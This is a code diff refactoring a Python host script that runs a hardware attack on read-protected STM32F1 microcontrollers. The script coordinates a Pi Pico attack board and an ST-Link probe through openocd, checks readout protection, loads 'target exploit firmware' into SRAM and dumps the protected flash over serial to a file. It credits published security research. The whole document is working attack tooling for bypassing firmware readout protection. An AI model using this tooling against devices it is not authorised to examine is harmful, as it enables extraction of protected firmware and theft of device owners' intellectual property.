@@ -13,9 +13,9 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
-# The following script launches the attack on the Pi Pico against the
-# STM32F1 target and dumps the fimrware to stdout and optionally a file
-# (see -o option) upon success.
+# The following script dumps the flash memory of a read-protected STM32F1 target
+# device using a Pi Pico running the attack firmware, and a debug probe
+# (ex. ST-Link).
 
 # This attack is based on the works of:
 #  Johannes Obermaier, Marc Schink and Kosma Moczek
@@ -25,8 +25,10 @@
 #  https://github.com/JohannesObermaier/f103-analysis/tree/master/h3
 #
 
-# Dependencies:
+# Python Dependencies:
 #  - pyserial
+# OS Dependencies:
+#  - openocd
 
 import argparse
 import time
@@ -38,9 +40,174 @@ BAUDRATE = 9600
 SCRIPT_VERSION = "1.0"
 REQ_ATTACK_BOARD_VERSION = "1.x"
 SERIAL_TIMEOUT_S = 0.5
+SRAM_START = 0x20000000
+MIN_OPENOCD_VERSION = "0.10.0"
 
 script_path = Path(__file__).resolve()
 default_targetfw_bin = str(script_path.parent / "target" / "target.bin")
+
+##############################################
+# Helper functions
+##############################################
+
+
+# Returns true if the serial port is used
+# Returns false if the serial port is not used
+def serial_used(port: str):
+    try:
+        ser = Serial(port, BAUDRATE, timeout=SERIAL_TIMEOUT_S)
+        ser.close()
+        return True
+    except SerialException:
+        return False
+
+
+# Waits until the serial port is no longer used
+def wait_serial_disconnect(port: str):
+    while True:
+        if serial_used(port) == False:
+            return
+        time.sleep(1)
+
+
+# Waits until the serial port becomes available
+def wait_serial_connect(port: str):
+    while True:
+        try:
+            ser = Serial(port, BAUDRATE, timeout=SERIAL_TIMEOUT_S)
+            return ser
+        except SerialException:
+            time.sleep(1)
+            continue
+
+
+# Returns the version of openocd
+def get_openocd_version():
+    result = subprocess.run(["openocd", "-v"], capture_output=True, text=True)
+    ver = None
+
+    for line in result.stderr.splitlines():
+        if "Open On-Chip Debugger " in line:
+            ver = line.split(" ")[3].split(".")
+
+    if ver == None or len(ver) != 3:
+        raise Exception("Could not determine openocd version")
+
+    return ver
+
+
+# Returns true if the openocd version is greater than or equal to the given version
+def openocd_version_geq(min_version: str):
+    current = get_openocd_version()
+    min = min_version.split(".")
+
+    if len(min) != 3:
+        raise Exception("Invalid version number: " + min_version + ", expected x.x.x")
+
+    for i in range(3):
+        if int(current[i]) > int(min[i]):
+            return True
+        elif int(current[i]) < int(min[i]):
+            return False
+
+    return True  # Versions are equal
+
+
+# Executes openocd with the given list of commands
+def openocd_run(interface: str, traget: str, cmds: list):
+    splist = ["openocd", "-f", "interface/" + interface, "-f", "target/" + traget]
+
+    for cmd in cmds:
+        splist.append("-c")
+        splist.append(cmd)
+
+    return subprocess.run(splist, capture_output=True, text=True)
+
+
+# Waits until the debug probe is connected
+# This is done by attempting to halt the target
+# until openocd does not return an error
+def wait_dbg_probe_connect():
+    while True:
+        result = openocd_run(
+            "stlink.cfg",
+            "stm32f1x.cfg",
+            ["init", "reset halt", "targets", "exit"],
+        )
+
+        for line in result.stderr.splitlines():
+            if "halted" in line:
+                return
+            elif "Error: expected 1 of 1" in line:
+                raise Exception(
+                    "Connected device does not be appear to be an STM32F1 device\nopenocd output: "
+                    + line
+                )
+
+        time.sleep(1)  # Wait for 1 second before retrying
+
+
+# Waits until the debug probe is disconnected
+# This is done by attempting to halt the target
+# until openocd returns an "open failed" error
+# or a "init mode failed" error
+def wait_dbg_probe_disconnect():
+    while True:
+        result = openocd_run(
+            "stlink.cfg",
+            "stm32f1x.cfg",
+            ["init", "reset halt", "targets", "exit"],
+        )
+
+        for line in result.stderr.splitlines():
+            if (
+                "Error: open failed" in line
+                or "Error: init mode failed (unable to connect to the target)" in line
+            ):
+                return
+
+        time.sleep(1)  # Wait for 1 second before retrying
+
+
+# Fetches the read protection status of the target
+# True if read protection is enabled
+# False if read protection is disabled
+def get_rdp_status():
+    result = openocd_run(
+        "stlink.cfg",
+        "stm32f1x.cfg",
+        ["init", "reset halt", "stm32f1x options_read 0", "exit"],
+    )
+
+    for line in result.stderr.splitlines():
+        if "read protection: on" in line:
+            return True
+        elif "read protection: off" in line:
+            return False
+
+    raise Exception(
+        "Could not determine read protection status\nopenocd output: " + line
+    )
+
+
+# Uploads the target firmware to the SRAM of the target
+def upload_target_fw(fw_path: str):
+    result = openocd_run(
+        "stlink.cfg",
+        "stm32f1x.cfg",
+        ["init", "load_image " + fw_path + " " + str(hex(SRAM_START)), "exit"],
+    )
+
+    for line in result.stderr.splitlines():
+        if "Error:" in line:
+            raise Exception(
+                "Failed to load target firmware to SRAM\nopenocd output: " + line
+            )
+
+
+##############################################
+# Main
+##############################################
 
 parser = argparse.ArgumentParser(description="")
 parser.add_argument("-o", "--output", help="Output file")
@@ -68,6 +235,14 @@ if Path(args.targetfw).is_file() == False:
     print("Could not find target firmware binary: " + args.targetfw)
     print(
         "Please build the target firmware first or specify the path to the binary via the -t option"
+    )
+    exit(1)
+
+# Check if openocd version is >= MIN_OPENOCD_VERSION
+if not openocd_version_geq(MIN_OPENOCD_VERSION):
+    print(
+        "OpenOCD version is too old, please update to at least version "
+        + MIN_OPENOCD_VERSION
     )
     exit(1)
 
@@ -128,34 +303,18 @@ if fname is None:
     print("WARNING: No output file specified, dumping to /dev/null")
     fname = "/dev/null"
 
-print_already_connected = False
-while True:
-    try:
-        ser = Serial(args.port, BAUDRATE)
-        if not print_already_connected:
-            print("Device already connected to " + args.port)
-            print(
-                "Please press the reset button on the Pi Pico or reconnect it to ensure a clean state"
-            )
-            print_already_connected = True
-        ser.close()
-        time.sleep(1)
-    except SerialException:
-        if print_already_connected:
-            print("Device disconnected")
-        break
+# Check if pico is already connected to the specified serial port
+# If so, request pico to be reset to ensure a clean state
+if serial_used(args.port):
+    print("Device already connected to " + args.port)
+    print(
+        "Please press the reset button on the Pi Pico or reconnect it to ensure a clean state"
+    )
+    wait_serial_disconnect(args.port)
 
+# Wait for pico to be (re-)connected to the specified serial port
 print("Waiting for Pi Pico to be connected... (Looking for " + args.port + ")")
-
-# Wait for serial port to be available
-while True:
-    try:
-        ser = Serial(args.port, BAUDRATE)
-        break
-    except SerialException:
-        time.sleep(1)
-        continue
-    break
+ser = wait_serial_connect(args.port)
 
 if ser.isOpen():
     print("Device connected to serial port " + args.port)
@@ -163,189 +322,43 @@ else:
     print("Failed to open serial port")
     exit(1)
 
+# Wait for debug probe to be connected to the STM32F1 target
 print("Waiting for debug probe to be connected...")
+wait_dbg_probe_connect()
+print("Debug probe connected to STM32F1 target")
 
-dbg_probe_connected = False
-while True:
-    try:
-        result = subprocess.run(
-            [
-                "openocd",
-                "-f",
-                "interface/stlink.cfg",
-                "-f",
-                "target/stm32f1x.cfg",
-                "-c",
-                "init",
-                "-c",
-                "reset halt",
-                "-c",
-                "reset_config none",
-                "-c",
-                "targets",
-                "-c",
-                "exit",
-            ],
-            capture_output=True,
-            text=True,
-        )
-        lines = result.stderr.splitlines()
-        for line in lines:
-            if "halted" in line:
-                print("Debug probe connected to STM32F1 target")
-                dbg_probe_connected = True
-                break
-            elif "Error: expected 1 of 1" in line:
-                print(
-                    "Error: Connected device does not be appear to be an STM32F1 device"
-                )
-                ser.close()
-                exit(1)
-
-        if dbg_probe_connected:
+# Check if the STM32F1 target is read protected
+# If not, ask the user if they want to continue
+# with the attack anyway
+rdp_status = get_rdp_status()
+if rdp_status:
+    print("STM32F1 target is confirmed to be read protected")
+else:
+    print("STM32F1 target is not read protected, the attack may not be necessary")
+    print("Do you wish to continue anyway? (y/n): ", end="")
+    while True:
+        choice = input().lower()
+        if choice == "y":
             break
+        elif choice == "n":
+            ser.close()
+            exit(0)
+        else:
+            print("Please respond with 'y' or 'n'")
 
-    except FileNotFoundError:
-        print("openocd command not found. Make sure it is installed.")
-        ser.close()
-        exit(1)
-
-    time.sleep(1)  # Wait for 1 second before retrying
-
-try:
-    result = subprocess.run(
-        [
-            "openocd",
-            "-f",
-            "interface/stlink.cfg",
-            "-f",
-            "target/stm32f1x.cfg",
-            "-c",
-            "init",
-            "-c",
-            "stm32f1x options_read 0",
-            "-c",
-            "exit",
-        ],
-        capture_output=True,
-        text=True,
-    )
-
-    read_protection_status = None
-    lines = result.stderr.splitlines()
-    for line in lines:
-        if "read protection: on" in line:
-            read_protection_status = True
-            print("STM32F1 target is indeed read protected")
-            break
-        elif "read protection: off" in line:
-            read_protection_status = False
-            print(
-                "STM32F1 target is not read protected, the attack may not be necessary"
-            )
-            print("Do you wish to continue anyway? (y/n): ", end="")
-            while True:
-                choice = input().lower()
-                if choice == "y":
-                    break
-                elif choice == "n":
-                    ser.close()
-                    exit(0)
-                else:
-                    print("Please respond with 'y' or 'n'")
-            break
-except FileNotFoundError:
-    print("openocd command not found. Make sure it is installed.")
-    ser.close()
-    exit(1)
-
-if read_protection_status is None:
-    print("Error: Could not determine read protection status")
-    print("Is your debug probe properl connected to the STM32F1 target?")
-    ser.close()
-    exit(1)
-
+# Upload the target firmware to SRAM
 print("Press any key to load the target exploit firmware to SRAM")
 input()
-
-try:
-    result = subprocess.run(
-        [
-            "openocd",
-            "-f",
-            "interface/stlink.cfg",
-            "-f",
-            "target/stm32f1x.cfg",
-            "-c",
-            "init",
-            "-c",
-            "reset_config none",
-            "-c",
-            "load_image " + args.targetfw + " 0x20000000",
-            "-c",
-            "exit",
-        ],
-        capture_output=True,
-        text=True,
-    )
-    lines = result.stderr.splitlines()
-    for line in lines:
-        if "Error:" in line:
-            print("Error: Failed to load target firmware to SRAM:")
-            print("\t" + line)
-            ser.close()
-            exit(1)
-
-except FileNotFoundError:
-    print("openocd command not found. Make sure it is installed.")
-    ser.close()
-    exit(1)
-
+upload_target_fw(args.targetfw)
 print("Target firmware loaded to SRAM")
 
+# Ensure user disconnects the debug probe from the target
 print("Waiting for debug probe to be disconnected...")
 print(
     "Warning: Disconnect the debug probe from the target, not just the host's USB port!"
 )
-disconnect_detected = False
-while True:
-    try:
-        result = subprocess.run(
-            [
-                "openocd",
-                "-f",
-                "interface/stlink.cfg",
-                "-f",
-                "target/stm32f1x.cfg",
-                "-c",
-                "init",
-                "-c",
-                "reset_config none",
-                "-c",
-                "targets",
-                "-c",
-                "exit",
-            ],
-            capture_output=True,
-            text=True,
-        )
-        lines = result.stderr.splitlines()
-        for line in lines:
-            if (
-                "Error: open failed" in line
-                or "Error: init mode failed (unable to connect to the target)" in line
-            ):
-                print("Debug probe disconnected from STM32F1 target")
-                disconnect_detected = True
-                break
-
-        if disconnect_detected:
-            break
-
-    except FileNotFoundError:
-        print("openocd command not found. Make sure it is installed.")
-        ser.close()
-        exit(1)
+wait_dbg_probe_disconnect()
+print("Debug probe disconnected from STM32F1 target")
 
 with open(fname, "wb") as f:
     # Wait for user input to launch attack
@@ -363,6 +376,7 @@ with open(fname, "wb") as f:
     while True:
         data = ser.read()
 
+        # Check if we've timed out
         if len(data) == 0:
             break
 
@@ -377,6 +391,9 @@ with open(fname, "wb") as f:
         if read_bytes % 16 == 0:
             print()
 
+    # Check if we managed to read any data
+    # If we haven't, something went wrong
+    # If we have, the dump is probably complete
     if read_bytes == 0:
         print("")
         print("Timeout: No data received from target")
